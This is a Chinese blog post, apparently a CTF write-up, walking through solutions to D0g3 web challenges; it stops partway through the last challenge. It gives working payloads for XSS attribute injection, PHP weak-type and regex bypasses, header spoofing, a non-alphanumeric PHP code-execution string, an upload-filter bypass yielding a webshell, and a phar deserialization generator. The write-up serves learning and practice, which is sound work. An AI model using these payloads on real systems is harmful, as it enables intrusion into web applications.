@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Kage's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言说好的要好好写博客呢，怎么这么久还没发布新文章。别急啦，文章并不是主要的，关键在于有没有在搞技术啦。最近国庆没什么事干，就到各个平台刷一下CTF，这里就总结一下道格平台web的wp。 $_GET前两题主要学习HTTP的两种传参方式，GET传参和POST传参，这也是web安全漏洞产生的两个主要入口。如何GET传参呢？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="道格ctf web wp">
+<meta property="og:url" content="http://yoursite.com/2018/10/06/道格ctf web wp/index.html">
+<meta property="og:site_name" content="Kage&#39;s Blog">
+<meta property="og:description" content="前言说好的要好好写博客呢，怎么这么久还没发布新文章。别急啦，文章并不是主要的，关键在于有没有在搞技术啦。最近国庆没什么事干，就到各个平台刷一下CTF，这里就总结一下道格平台web的wp。 $_GET前两题主要学习HTTP的两种传参方式，GET传参和POST传参，这也是web安全漏洞产生的两个主要入口。如何GET传参呢？在网页的网址就是url末尾加上？然后以键值对形式表示，多个值要用&amp;amp;分隔。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/img/10501.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10502.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10505.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10503.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10504.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10506.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10507.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10508.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10509.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10510.jpg">
+<meta property="og:image" content="http://yoursite.com/img/10511.jpg">
+<meta property="og:updated_time" content="2018-10-05T17:06:15.973Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="道格ctf web wp">
+<meta name="twitter:description" content="前言说好的要好好写博客呢，怎么这么久还没发布新文章。别急啦，文章并不是主要的，关键在于有没有在搞技术啦。最近国庆没什么事干，就到各个平台刷一下CTF，这里就总结一下道格平台web的wp。 $_GET前两题主要学习HTTP的两种传参方式，GET传参和POST传参，这也是web安全漏洞产生的两个主要入口。如何GET传参呢？在网页的网址就是url末尾加上？然后以键值对形式表示，多个值要用&amp;amp;分隔。">
+<meta name="twitter:image" content="http://yoursite.com/img/10501.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/06/道格ctf web wp/"/>
+
+
+
+
+
+  <title>道格ctf web wp | Kage's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://your-url" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Kage's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Kage's Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/06/道格ctf web wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Kage">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kage's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">道格ctf web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-06T00:06:46+08:00">
+                2018-10-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说好的要好好写博客呢，怎么这么久还没发布新文章。别急啦，文章并不是主要的，关键在于有没有在搞技术啦。最近国庆没什么事干，就到各个平台刷一下CTF，这里就总结一下道格平台web的wp。</p>
+<h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p>前两题主要学习HTTP的两种传参方式，GET传参和POST传参，这也是web安全漏洞产生的两个主要入口。<br>如何GET传参呢？在网页的网址就是url末尾加上？然后以键值对形式表示，多个值要用&amp;分隔。<br>Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.12.21.77:8080/get/get.php?what=flag</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h2 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h2><p>POST传参可以用火狐一个很好用的插件Hackerbar来进行，当然还可以用burpsuit进行抓包修改。这两个工具都是web安全最常用也是必须掌握的哦。<br><img src="/img/10501.jpg" alt=""></p>
+<h2 id="突破物理极限"><a href="#突破物理极限" class="headerlink" title="突破物理极限"></a>突破物理极限</h2><p>好难受，被限制只能输入3个字符，怎么办？</p>
+<p>其实对于别人发过来的前端页面，我们都是可以进行修改的。可以在各个浏览器按F12调出控制台修改，我是用的火狐的Firebug进行修改。</p>
+<p>当然以后在验证码绕过啊，js限制什么的也可以用同样的方法。<br><img src="/img/10502.jpg" alt=""></p>
+<h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$KEY = &quot;D0g3!!!&quot;;</span><br><span class="line">$str = $_GET[&apos;str&apos;];</span><br><span class="line">if (unserialize($str) === &quot;$KEY&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>审一下代码，这题关键在于如何<code>if (unserialize($str) === &quot;$KEY&quot;)</code>这个条件为真，这就涉及到一些反序列化的知识，简单总结一下。</p>
+<p>为了方便不同的php文件在各个对象、数组、字符串的传输，php引入了序列化。序列化通俗点讲就是把对象、数组和字符串转换成一串带有特定格式的json字符串进行数据传输，而反序列化当然就是把json字符串转换成数组对象等。当然这方面知识可以学习下网上的一些文章，毕竟是wp不过多解释了。</p>
+<p>这里构造json字符串进行反序列化绕过判断。如果不想构造的话，也可以自己写个php文件，序列化自己想要的东西，输出出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = &quot;D0g3!!!&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22;</span><br></pre></td></tr></table></figure>
+<h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>这题刚开始打开题目的时候，有点懵逼，没有提交按钮怎么上传数据，后来发现是用GET传参，真是不按套路…</p>
+<p>查看源码，很容易发现，注入点在<code>value=&#39;111&#39;</code>处。试了下尖括号和”发现都被过滤，应该是对输入点进行了<code>htmlspecialchars()</code>函数的过滤。</p>
+<p>但是这个函数并不对单引号过滤并且注入点在标签内，尝试构造语句。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.33.253:9004/?id=&apos; onclick=alert(&apos;xss&apos;) a=&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="机器人"><a href="#机器人" class="headerlink" title="机器人"></a>机器人</h2><p>从题目提示和robots.html，很明显知道应该要检查一下robots.txt。</p>
+<p>robots.txt是用来告诉爬虫机器人，什么文件是不希望被看到，并且不允许爬取的（强行爬也不是不可以…）</p>
+<p>查看robots.txt，看到Disallow: /robots/flag.txt</p>
+<p>查看flag.txt得到flag</p>
+<h2 id="爆破拿flag"><a href="#爆破拿flag" class="headerlink" title="爆破拿flag"></a>爆破拿flag</h2><p>看题目当然就知道要用爆破的方法，提示五位数密码，爆破一般可以自己写python脚本，也可以用burpsuit工具来实现。<br><img src="/img/10505.jpg" alt=""></p>
+<h2 id="数字比较"><a href="#数字比较" class="headerlink" title="数字比较"></a>数字比较</h2><p>这道题直接给了我们源码，应该是要让我们自己搭环境测试的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">	$flag = &quot;xxxxx&quot;;</span><br><span class="line">	$one = ord(&apos;1&apos;); //ord ¡ª ·µ»Ø×Ö·ûµÄ ASCII ÂëÖµ</span><br><span class="line">	$nine = ord(&apos;9&apos;); //ord ¡ª ·µ»Ø×Ö·ûµÄ ASCII ÂëÖµ</span><br><span class="line">	$number = &apos;3735929050&apos;;</span><br><span class="line">	// Check all the input characters!</span><br><span class="line">	for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">	&#123;	</span><br><span class="line">		// Disallow all the digits!</span><br><span class="line">		echo &apos;第&apos;.($i+1).&apos;次： &apos;;</span><br><span class="line">		echo &apos;temp=&apos;.$temp.&apos; &apos;;</span><br><span class="line">		$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">		echo &apos;digit=&apos;.ord($temp&#123;$i&#125;);</span><br><span class="line">		echo &apos;one=&apos;.$one.&apos; &apos;;</span><br><span class="line">		echo &apos;nine=&apos;.$nine.&apos; &apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line">		if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">		&#123;</span><br><span class="line">			// Aha, digit not allowed!</span><br><span class="line">			return &quot;flase&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if($number == $temp)</span><br><span class="line">		return $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>题目大致意思是，对于我们输入的一串数字，会分解成单个数字，并将他的ascii值与1和9的ascii值比较，如果在1~9内就返回false，通过判断最后和代码内置的数字串进行比较，一样就返回flag。</p>
+<p>很明显是考php弱类型，用之前总结的数字字母比较，二进制比较什么的都失败了，后来尝试传’空格+3735929050’尽然成功绕过判断，这题涨知识了。</p>
+<p>空格+数字==数字</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://206.189.214.99:1080/2.php?password=                 3735929050</span><br></pre></td></tr></table></figure>
+<h2 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h2><p>打开题目，有点可恶，什么都不给点。<br>果断打开firebug，把那些作恶的javascript删掉，删的同时看到了出题人的flag代码嘿嘿嘿，偷偷改造一下。<br><img src="/img/10503.jpg" alt=""><br>点击搜索，成功弹出<br><img src="/img/10504.jpg" alt=""></p>
+<p>其实我不是用这个方法做的，之前题目挂了没法做，就先做后面的WEB||Linux，拿到那题的shell以后，尽然能在里面www目录下找到这题的源码。。。问了下出题人，主要是docker数量有限，没办法..算是非预期解吧..</p>
+<h2 id="你能让他停下来吗"><a href="#你能让他停下来吗" class="headerlink" title="你能让他停下来吗"></a>你能让他停下来吗</h2><p>这题当时做的时候很简单，只要用burpsuit抓下包看下返回包的头信息就可以了。</p>
+<p>但是整理wp的时候，题目好像又改造了下加大了点难度。<br>我们直接访问index.html，仔细观察可以发现已经跳转到了location.html，根据提示应该是用了js的windowlocation跳转。那我们应该怎么抓住index.html呢？</p>
+<p>可以先用burpsuit抓到location.php，然后传到Repeater模块进行重放，把location.php改为index.php就能抓到包了。<br><img src="/img/10506.jpg" alt=""></p>
+<h2 id="欢迎加入道格小组"><a href="#欢迎加入道格小组" class="headerlink" title="欢迎加入道格小组"></a>欢迎加入道格小组</h2><p>提示要内部访问，并且从referer.php就知道要添加http头。</p>
+<p>referer：告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>
+<p>添加referer头成功绕过检测。<br><img src="/img/10507.jpg" alt=""></p>
+<h2 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h2><p>与上一题类似，将user-agent修改就行了。<br><img src="/img/10508.jpg" alt=""></p>
+<h2 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h2><p>同样考点，添加X-forwarded-for:127.0.0.1</p>
+<p>127.0.0.1指的是本地ip地址。<br><img src="/img/10509.jpg" alt=""></p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这题信安之路的一个老哥的文章写的很棒，可以去学习一下。第一次接触到这种东西的时候，真的觉得太骚了，膜拜一下师傅们。<a href="https://www.liuxianglai.top/?p=145" target="_blank" rel="noopener">PHP不使用数字,字母和下划线写shell</a></p>
+<p>当然这题要直接自己构造payload还是要花点时间的，可以用下老哥上面的通解。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.33.253:9000/index.php?code=$&#123;%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22&#125;[%27%2b%27]();&amp;%2b=flag</span><br></pre></td></tr></table></figure>
+<h2 id="Match-it"><a href="#Match-it" class="headerlink" title="Match it"></a>Match it</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;f1agi3hEre.php&apos;;</span><br><span class="line">if  (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[&apos;password&apos;];</span><br><span class="line">    if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;Wrong Format&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c = 0;</span><br><span class="line">        $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">            $c += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">        else echo &apos;Wrong password&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审一下源码，主要是三层正则匹配的绕过。</p>
+<p>第一层<code>if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password))</code>意思是至少要输入12个字符。<br>第二层<code>$reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;</code>意思是在标点、数字、小写和大写不同类的字符，都要切换组合至少6次，如：数字+标点+数字+字母+数字+字母。<br>第三层<code>if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</code>是循环的正则匹配，意思是至少要出现三个种类的字符。</p>
+<p>最后是字符串的弱类型比较，这样分析完，就能够构造payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=42.0e+000000000</span><br></pre></td></tr></table></figure>
+<h2 id="wafupload"><a href="#wafupload" class="headerlink" title="wafupload"></a>wafupload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">    #mime check</span><br><span class="line">    if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This type is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #check filename</span><br><span class="line">    $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];</span><br><span class="line">    if (!is_array($file)) &#123;</span><br><span class="line">        $file = explode(&apos;.&apos;, strtolower($file));</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($file);</span><br><span class="line">    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This file is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br><span class="line">    if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) &#123;</span><br><span class="line">        echo &apos;Success!&apos;;</span><br><span class="line">        echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;</span><br><span class="line">    &#125; else        echo &apos;Failed!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__file__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第一层，对$_FILES全局变量的mime进行检测。</p>
+<p>第二层，判断条件里的<code>!is_array($file)</code>很明显的提示我们，$file传入一个数组不就绕过字符串的切割了么，那就能够随意构造了。</p>
+<p>第三层后缀名过滤和文件名拼接有两个地方的不一致导致漏洞。<code>end($file)</code>和<code>$file[count($file) - 1]</code>都想指后缀名。</p>
+<p>end()：将数组的内部指针指向最后一个单元，通俗讲就是谁后传指向谁。</p>
+<p>那么我们可以把下标小的后传就能造成两个函数指向的不一致。<br><img src="/img/10510.jpg" alt=""></p>
+<p>连上蚁剑拿到flag<br><img src="/img/10511.jpg" alt=""></p>
+<h2 id="不认真的upload"><a href="#不认真的upload" class="headerlink" title="不认真的upload"></a>不认真的upload</h2><p>这题老哥参考链接讲的很棒啦，我也是现学现卖的。<a href="http://note.youdao.com/" target="_blank" rel="noopener">四个实例递进php反序列化漏洞理解</a></p>
+<p>随便上传一个jpg文件，根据提示访问flag.php，查看源码，得到php代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$recieve = $_GET[&apos;filename&apos;];</span><br><span class="line"></span><br><span class="line">class flag&#123;</span><br><span class="line">	var $file;</span><br><span class="line">	private $flag = &apos;****&apos;;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if ($this-&gt;file == &apos;phar&apos;)&#123;</span><br><span class="line">			echo $this-&gt;flag;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_get_contents($recieve);</span><br></pre></td></tr></table></figure>
+<p>根据代码，要构造一个flag对象，并且对象的file属性要等于phar才能得到flag，那么构造我们的phar文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class flag&#123;</span><br><span class="line">    var $file = &quot;phar&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;kage.phar&quot;);</span><br><span class="line">$test = new flag();</span><br><span class="line">$phar = new Phar(&quot;kage.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>生成gif上传成功，到flag.php，引用文件就行了</p>
+<p>payload：</p>
